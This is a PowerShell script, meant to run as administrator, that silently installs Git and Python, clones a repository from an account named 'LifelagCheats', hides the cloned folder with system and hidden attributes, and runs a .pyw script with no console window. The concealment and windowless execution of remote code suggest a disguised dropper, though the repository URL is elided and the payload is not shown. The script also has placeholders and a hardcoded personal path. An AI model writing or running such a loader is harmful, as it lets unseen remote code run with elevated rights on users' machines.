# Save this file as SetupAndRun.ps1 and run it with administrative privileges

# CONFIGURATION VARIABLES
$repoUrl  = "https://github.com/LifelagCheats/..."  # Change this to your repo URL
$repoName = "..."                                      # Expected folder name after cloning
$mainScript = "script.pyw"                             # The script to execute inside the repo

# Function to check if a command exists
function Command-Exists {
    param([string]$cmd)
    $ErrorActionPreference = 'SilentlyContinue'
    $exists = Get-Command $cmd -ErrorAction SilentlyContinue
    $ErrorActionPreference = 'Continue'
    return $exists -ne $null
}

Write-Host "Starting setup..."

# 1. Install Git if not already installed
if (-not (Command-Exists "git")) {
    Write-Host "Installing Git..."
    $git_url = "https://api.github.com/repos/git-for-windows/git/releases/latest"
    $asset = Invoke-RestMethod -Method Get -Uri $git_url | % assets | Where-Object name -like "*64-bit.exe"
    
    if ($asset) {
        $installer = "$env:temp\$($asset.name)"
        Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $installer
        
        $git_install_inf = "<install inf file>"
        $install_args = "/SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /RESTARTAPPLICATIONS /LOADINF=\"$git_install_inf\""
        
        Start-Process -FilePath $installer -ArgumentList $install_args -Wait
    } else {
        Write-Host "Failed to fetch Git installer."
    }
} else {
    Write-Host "Git is already installed."
}

# 2. Install Python if not already installed
if (-not (Command-Exists "python")) {
    Write-Host "Installing Python..."
    Invoke-WebRequest -UseBasicParsing -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile 'c:/veera/python-3.11.0-amd64.exe'
    Start-Process -FilePath 'c:/veera/python-3.11.0-amd64.exe' -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
    setx /M path "%path%;C:\Program Files\Python311\"
    $env:PATH = $env:PATH + ";C:\Program Files\Python311\"
} else {
    Write-Host "Python is already installed."
}

# 3. Clone the repository
Write-Host "Cloning repository..."
if (Test-Path $repoName) {
    Write-Host "Repository folder '$repoName' already exists. Removing it..."
    Remove-Item -Recurse -Force $repoName
}
git clone $repoUrl
attrib +s +h $repoName
# 4. Change directory into the repo folder
Set-Location $repoName


Write-Host "Upgrading pip and installing requirements..."
python -m pip install --upgrade pip
if (Test-Path "requirements.txt") {
    python -m pip install -r requirements.txt
} else {
    Write-Host "No requirements.txt file found."
}

# 6. Execute the main script
Write-Host "Executing the main script: $mainScript"
pythonw.exe $mainScript

Write-Host "Setup complete."
